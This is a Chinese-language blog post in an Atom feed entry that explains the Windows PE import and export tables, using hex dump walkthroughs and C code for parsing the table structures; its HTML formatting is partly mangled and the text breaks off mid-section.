    <link href="https://findream.github.io/2019/04/18/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3PE%E4%B8%89%E8%A1%A8/"/>
    <id>https://findream.github.io/2019/04/18/一篇文章带你理解PE三表/</id>
    <published>2019-04-18T07:02:11.000Z</published>
    <updated>2019-07-21T08:53:51.500Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;刚刚结束春招，投了好几家公司，结果不是很理想，原因无外乎自身实力和行业寒冬。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这次春招面试题主要集中在PE相关，HOOK技术和DLL注入技术，还有一些杂七杂八的问题上面。从中也暴露处自己技能栈上的不足，通过这一段时间的沉淀希望可以补足。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;四月初就开始谋划写一系列的文章，但是加上在校实习比较忙碌，所以进展很慢，这些文章主要面向受众是那些入坑新人，借此希望能够让那些小伙伴能够少走弯路。同时也能多多总结自身的不足，共同进步。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这系列文章取啥名？想了很久，决定参考某一师傅的系列文章—&lt;一篇文章带你·····&gt;,主要希望总结PE文件，HOOK,DLL注入，以及其他方面的知识，主要的参考文献是看雪<strong>加密解密第四版</strong>，以及其他资料。(打了广告，希望相关师傅记得打点广告费)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这系列是我边总结技术边写文章，可能部分内容会以后补全技能栈，例如R0下的DLL注入等。<strong>但是尽量做到不鸽</strong>，关于代码，不提供自己写的代码，原因有二，第一，这些代码网上都有现成的，我只是理解修改部分罢了，也怕自己的代码误导小伙伴们。<strong>第二，拒绝伸手党</strong>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于自身能力有限，文章中难免出现错误，希望各位师傅少喷我。</p><a id="more"></a><h1 id="0x1-PE导入表"><a href="#0x1-PE导入表" class="headerlink" title="0x1 PE导入表"></a>0x1 PE导入表</h1><h2 id="0x1-1-输入函数的调用"><a href="#0x1-1-输入函数的调用" class="headerlink" title="0x1.1 输入函数的调用"></a>0x1.1 输入函数的调用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DLL动态链接库文件主要实现代码的复用。当一个程序调用DLL文件中的数据和代码的时候，有两种链接方式，第一种是<strong>隐式链接</strong>，这个过程是由windows装载器完成的，另外一种是<strong>显式链接</strong>，通过使用LoadLibrary和GetProcAddress这两个API函数实现的。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当隐式的调用一个API函数的时候，同样也存在类似于LoadLibrary和GetProcAddress函数的功能实现，但是，这个操作是由windows装载器完成的，所以称为<strong>隐式链接</strong>，当程序使用隐式链接调用DLL代码的时候，装载器需要完成以下几个步骤(IAT填充):</p><ul><li>首先将所需要的DLL文件载入内存，Kernel32.dll等是通过映射的方式载入的</li><li>定位IID，寻找IID的第四个字段Name。</li><li>接着根据OrginalFirstThunk指向，获取INT。</li><li>根据INT执行的IMAGE_IMPORT_BY_NAME结构获取函数名称</li><li>利用类似于GetProcAddress函数功能的操作，获取函数地址VA</li><li>将获取的API函数地址填充入IAT。</li><li>断链，将FirstThunk断开</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序一般使用CALL-JMP的方式调用API方式，显然，这种方式是低效的，不然直接使用CALL高效，之所以使用这种方式，因为编译器无法判断哪些调用是API，哪些调用是普通函数。JMP的地址其实是IAT所在的地址VA。</p><h2 id="0x1-2-导入表结构"><a href="#0x1-2-导入表结构" class="headerlink" title="0x1.2 导入表结构"></a>0x1.2 导入表结构</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在PE文件可选头中，数据目录项的第一个成员指向的导入表。可以看到2040是一个RVA，这是在内存中的偏移量。我们需要将它转化为文件偏移。<br>    <img src="https://ws3.sinaimg.cn/large/005BYqpgly1g26qg7gjykj30ik01rq2p.jpg" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们可以看到2040位于.rdata段中。可以使用公式<strong>section[i].PointOfRawData+(offset-VirtuallAddress)</strong>来计算文件偏移。计算出来的文件偏移为600+(2040-2000)=640.也就是说PE导入表在文件中640H的地方。<br>    <img src="https://i.loli.net/2019/04/18/5cb8139b7a014.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样的，我们可以使用代码实现这一个需求，代码如下：</p><ul><li>0.定位第一个节区地址</li><li>1.获取节区数目</li><li>2.判断RVA在那个节区</li><li>3.计算:section[i].PointOfRawData+(offset-VirtuallAddress)</li></ul><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">DWORD RvaToOffset(DWORD ImageAddr, LPVOID lpBaseAddress)</div><div class="line">&#123;</div><div class="line"><span class="regexp">//</span>NtHeader</div><div class="line">PIMAGE_NT_HEADERS pNtHeaders = <span class="function"><span class="params">(PIMAGE_NT_HEADERS)((ULONG_PTR)lpBaseAddress + ((PIMAGE_DOS_HEADER)lpBaseAddress)-&gt;e_lfanew)</span>;</span></div><div class="line"><span class="function">//获取第一个节区的RawtoData</span></div><div class="line"><span class="function">PIMAGE_SECTION_HEADER pSectionHeader = <span class="params">(PIMAGE_SECTION_HEADER)(((ULONG_PTR)&amp;pNtHeaders-&gt;OptionalHeader) + pNtHeaders-&gt;FileHeader.SizeOfOptionalHeader)</span>;</span></div><div class="line"><span class="function">if <span class="params">(ImageAddr &gt; pNtHeaders-&gt;OptionalHeader.SizeOfImage)</span></span></div><div class="line"><span class="function">&#123;</span></div><div class="line"><span class="function">printf<span class="params">(<span class="string">"ImageAddr Is Error\n"</span>)</span>;</span></div><div class="line"><span class="function">return NULL;</span></div><div class="line"><span class="function">&#125;</span></div><div class="line"><span class="function">if <span class="params">(ImageAddr &lt; pSectionHeader[<span class="number">0</span>].PointerToRawData)</span></span></div><div class="line"><span class="function">&#123;</span></div><div class="line"><span class="function">return ImageAddr;</span></div><div class="line"><span class="function">&#125;</span></div><div class="line"><span class="function">DWORD i = 0;</span></div><div class="line"><span class="function">for <span class="params">(i = <span class="number">0</span>; i &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; i++)</span></span></div><div class="line"><span class="function">&#123;</span></div><div class="line"><span class="function">//节区下限</span></div><div class="line"><span class="function">DWORD lower = pSectionHeader[i].VirtualAddress;</span></div><div class="line"><span class="function">//节区上线</span></div><div class="line"><span class="function">DWORD maxer = pSectionHeader[i].VirtualAddress + pSectionHeader[i].Misc.VirtualSize；</span></div><div class="line"><span class="function">if <span class="params">(ImageAddr &gt;= lower &amp;&amp; ImageAddr &lt;= maxer)</span></span></div><div class="line"><span class="function">&#123;</span></div><div class="line"><span class="function">return pSectionHeader[i].PointerToRawData + <span class="params">(ImageAddr - pSectionHeader[i].VirtualAddress)</span>;</span></div><div class="line"><span class="function">&#125;</span></div><div class="line"><span class="function">&#125;</span></div><div class="line"><span class="function">&#125;</span></div><div class="line"><span class="function">``` </span></div><div class="line"><span class="function">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这时候，我们需要用到新的知识IMAGE_IMPORT_DIRECTORY结构。简称IID。**IID结构对应着一个被隐式链接的DLL**，每个IID的结束标志为NULL。关于IID结构：</span></div></pre></td></tr></table></figure><p>typedef struct _IMAGE_IMPORT_DESCRIPTOR {<br>    union {<br>        DWORD Characteristics;<br>        DWORD OriginalFirstThunk;            //INT(RBA)<br>    };<br>    DWORD TimeDateStamp;                    //时间戳<br>    DWORD ForwarderChain;<br>    DWORD Name;                                //DllName(RVA)<br>    DWORD FirstThunk;                        //IAT(RVA)<br>} IMAGE_IMPORT_DESCRIPTOR;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;需要我们关心的成员有三个：</div><div class="line"></div><div class="line">* OriginalFirstThunk：一个指向导入名称表(INT)**首地址**的RVA.</div><div class="line">* Name:一个指向隐式映射的dll的名称的RVA</div><div class="line">* FirstThunk:一个指向导入地址表(IAT)**首地址**的RVA</div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;OriginalFirstThunk和FirstThunk都是指向一个名为IMAGE_THUNK_DATA的结构体，其中被OriginalFirstThunk指向的是导入名称表(INT)，被FirstThunk指向的是导入地址表(IAT)。而INT和IAT同时都指向一个新的结构IAMGE_IMPORT_BY_NAME。</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb82e31570e7.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;接下来，依照IMAGE_IMPORT_DESCRIPTOR来解析上面我们在文件中获取的IID数据如下。但是这些都是小端序显示的，首先需要转化为大端序，然后在使用上面讲的方法将其转化为文件偏移。</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb81c4e40fa0.png)</span></div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb81df448b5c.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;首先查看<span class="number">774</span>和<span class="number">7</span>B4对应的DLL名称。</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb81e9677ba3.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;然后再来查看一下OriginalFirstThunk对应的INT数据，在此之前，我们需要了解一下IMAGE_THUNK_DATA这个数据结构。但是u1是一个共用体，怎么判断IAT中的IMAGE_THUNK_DATA中存储的是Ordinal，还是AddressOfData？**当IMAGE_THUNK_DATA最高位为<span class="number">1</span>的时候，表示序号导入，否则为字符导入，此时保存的是AddressOfData，一个指向IMAGE_IMPORT_BY_NAM的RVA**。一个IMAGE_THUNK_DATA对应一个函数(_IMAGE_IMPORT_BY_NAME)。</div></pre></td></tr></table></figure></p><p>typedef struct _IMAGE_THUNK_DATA<br>{<br>    union<br>    {<br>         PBYTE ForwarderString;<br>         PDWORD Function;     //被导入的函数的入口地址<br>         DWORD Ordinal;       // 该函数的序数<br>         PIMAGE_IMPORT_BY_NAME AddressOfData;   // 一个RVA地址，指向IMAGE_IMPORT_BY_NAME<br>     }u1;<br>} IMAGE_THUNK_DATA32;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;在上面，我们了解了IMAGE_THUNK_DAT结构，而且知道了OriginalFirstThunk指向的是IMAGE_THUNK_DAT(INT)。所以，在文件偏移<span class="number">68</span>Ch处，找到数据<span class="number">10210000</span>，同样的，我们将它转化端序和文件偏移得到<span class="number">10210000</span>---&gt;<span class="number">2110</span>---&gt;<span class="number">710</span>。在<span class="number">710</span>处，我们应该可以得到IMAGE_IMPORT_BY_NAME这个结构体。现在，我们需要了解一下这个结构体的形式.</div></pre></td></tr></table></figure></p><p>typedef struct _IMAGE_IMPORT_BY_NAME {<br>     WORD    Hint;       //函数需序号<br>     BYTE    Name[1];    //函数名称<br> } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;了解完IMAGE_IMPORT_BY_NAME这个结构体，在文件<span class="number">710</span>H处查看IMAGE_IMPORT_BY_NAME</div><div class="line">     ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb8264224925.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;由于IID是一个双桥结构，刚刚我们通过OriginalFirstThunk间接通过IAT寻找到了IMAGE_IMPORT_BY_NAME。接下来使用FirstThunk寻找IMAGE_IMPORT_BY_NAME。可以发现两处都是指向同一个地址，而且这个地址就是IMAGE_IMPORT_BY_NAME</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb82826e90dc.png)</span></div><div class="line"></div><div class="line"><span class="meta">## 0x1.3 导入表编程</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;编程实现文件中导入表获取，首先利用ReadFile函数将对象PE文件读入内存,这里可以使用多种方法读取。</div></pre></td></tr></table></figure></p><p>if (!ReadFile(hFile, lpBaseAddress, dwFileSize, &amp;dwNumberOfBytesRead, NULL))<br>{<br>    printf(“ReadFile:%d\n”, GetLastError());<br>    return FALSE;<br>}<br>PrintImportTable(lpBaseAddress);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;然后在数据目录第二项获取导入表的RVA。但是需要注意的是，必须加上文件在内存中的基地址，这样才是IID的地址。</div></pre></td></tr></table></figure></p><p>//获取导入表地址<br>DWORD Rav_Import_Table = pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;<br>PIMAGE_IMPORT_DESCRIPTOR ImportTable = PIMAGE_IMPORT_DESCRIPTOR((ULONG_PTR)lpBaseAddress + Rav_Import_Table);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;接下来是遍历IMAGE_IMPORT_DESCRIPTOR，因为IMAGE_IMPORT_DESCRIPTOR个数是和隐式链接的dll数一致的，但是，IID结束的标志为全<span class="number">0</span>。所以只需要比较从第一个IID开始，如果有sizeof(IMAGE_IMPORT_DESCRIPTOR)个<span class="number">0</span>的话，说明IID遍历结束</div></pre></td></tr></table></figure></p><p>for (i = 0; memcmp(ImportTable + i, &amp;null_iid, sizeof(null_iid)); i++){}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;打印DLLNAME，利用IMAGE_IMPORT_DIRECTORY-&gt;Name打印DllName。同上，需要加上基地址</div></pre></td></tr></table></figure></p><p>DllName = (LPCSTR)((ULONG_PTR)lpBaseAddress + ImportTable-&gt;Name);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;获取OriginalFirstThunk。和IID一样的原理遍历INT。</div></pre></td></tr></table></figure></p><p>PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((ULONG_PTR)lpBaseAddress + ImportTable[i].OriginalFirstThunk);<br>//遍历同一个IID下的OriginalFirstThunk<br>for (j = 0; memcmp(pThunk + j, &amp;null_thunk, sizeof(PIMAGE_THUNK_DATA)); j++){}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;之前说过根据OriginalFirstThunk高位是否为<span class="number">1</span>判断导入方式，如果高位为<span class="number">1</span>,使用序号的方式导入，否则按照函数名称导入</div></pre></td></tr></table></figure></p><p>if (pThunk[j].u1.AddressOfData&amp;IMAGE_ORDINAL_FLAG)   //按标号导入<br>{<br>    //<br>}<br>else   //按名称导入<br>{<br>    //<br>}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta"># 0x2 导出表</span></div><div class="line"><span class="meta">## 0x2.1 导出表的作用</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;我们都知道DLL是实现代码复用的重要方式，同时为了让调用DLL的PE文件(包括exe和dll)知道哪些函数是可以被复用的，所以dll会将可以被导出的函数的RVA值保存在导出表中。</div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;导出表事实上并不只是存在于DLL中，同时也可能存在于exe中。当一个PE文件被装载的时候，装载器会将PE文件中所有被登记的DLL一起载入，然后根据DLL的导出表对导入表中的IAT进行修正。</div><div class="line"></div><div class="line"><span class="meta">## 0x2.2 导出表结构</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;导出表描述信息位于可选头的数据目录中的第一项。<span class="number">4000</span>是导出表的RVA值，需要转化为FOA值。利用导入表的公式`section[i].PointOfRawData+(RVA-VirtuallAddress)`进行计算，得到FOA为C00.</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbd8cd14763.png)</span></div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbd9b42b0b9.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;这时候，我们在文件中的C00处就可以找到我们导出目录了。我们现在需要了解一下导出目录`IMPORT_EXPORT_DIRECTORY`这个结构.其中我们需要重点关心的成员有以下几个。</div><div class="line"></div><div class="line">* Name:导出函数的文件名RVA</div><div class="line">* Base:导出函数起始需要，在导出函数序号表中的值，需要加上此值才是导出函数真正的序号</div><div class="line">* NumberOfFunctions：导出函数个数</div><div class="line">* NumberOfNames：名称导出函数个数</div><div class="line">* AddressOfFunctions;        <span class="comment">//指向到处函数地址表的RVA</span></div><div class="line">* AddressOfNames;            <span class="comment">//指向函数名地址表的AVA</span></div><div class="line">* AddressOfNameOrdinals;     <span class="comment">//指向函数名序号表的RVA</span></div></pre></td></tr></table></figure></p><p>typedef struct _IMAGE_EXPORT_DIRECTORY {<br>    DWORD Characteristics;<br>    DWORD TimeDateStamp;            //输出表的创建时间<br>    WORD MajorVersion;                      //输出表的主版本号。未使用设置为0<br>    WORD MinorVersion;                      //输出表的次版本号。未使用设置为0<br>    DWORD Name;                //指向一个与输出函数关联的文件名的RVA<br>    DWORD Base;                //导出函数的起始序号<br>    DWORD NumberOfFunctions;        //导出函数的总数<br>    DWORD NumberOfNames;            //以名称导出的函数总数<br>    DWORD AddressOfFunctions;        //指向到处函数地址表的RVA<br>    DWORD AddressOfNames;            //指向函数名地址表的AVA<br>    DWORD AddressOfNameOrdinals;            //指向函数名序号表的RVA<br>} IMAGE_EXPORT_DIRECTORYM, *pIMAGE_EXPORT_DIRECTORY<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;如下图是导出表的数据。可以看到`<span class="number">32</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span>`对应的是Name这个成员变量的RVA，我们调整端序，计算FOA(<span class="number">32400000</span>---&gt;<span class="number">00004032</span>---&gt;C32)可到Name在文件中的位置是C32.正好指向DllDemo.dll这个字符串。根据上述方法解析导出表数据如下</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbdd659be05.png)</span></div><div class="line"></div><div class="line">* Name：[C06]=C32--&gt;<span class="string">"DllDemo.dll"</span>  (rva)</div><div class="line">* Base：[C10]=<span class="string">"00000001"</span></div><div class="line">* NumberOfFunctions:[C14]=<span class="string">"00000001"</span></div><div class="line">* NumberOfNames:[C18]=<span class="string">"00000001"</span></div><div class="line">* AddressOfFunctions:[C1C]=C28---&gt;<span class="number">08100000</span> (RVA)</div><div class="line">* AddressOfNames:[C20]=C2C---&gt;<span class="string">"MsgBox"</span>     (RVA)</div><div class="line">* AddressOfNameOrdinals[C24]=C30---&gt;<span class="number">0000</span>   (RVA) </div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;【重点】PE装载器调用GetProcAddress来填充IAT，这时候需要了解GetProcAddress原理。</div><div class="line"></div><div class="line">* 定位到IMAGE_EXPORT_DIRECTORY结构</div><div class="line">* 判断Name是否是传入的DllName</div><div class="line">* 获取ENT数组的起始地址，寻找FuncName，如果找到记录在ENT的数组索引。</div><div class="line">* 然后读取导出函数序号数据的第一项的序号值</div><div class="line">* 使用Base+序号的值到EAT中寻找地址</div><div class="line"></div><div class="line"><span class="meta">## 0x2.3 导出表编程</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;首先需要在数据目录中获取导出表地址，需要注意的是这个地址是个RVA的值，需要加上BaseAddress。</div></pre></td></tr></table></figure></p><p>DWORD Rav_Export_Table = pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;<br>PIMAGE_EXPORT_DIRECTORY ExportTable = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)lpBaseAddress + Rav_Export_Table);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span 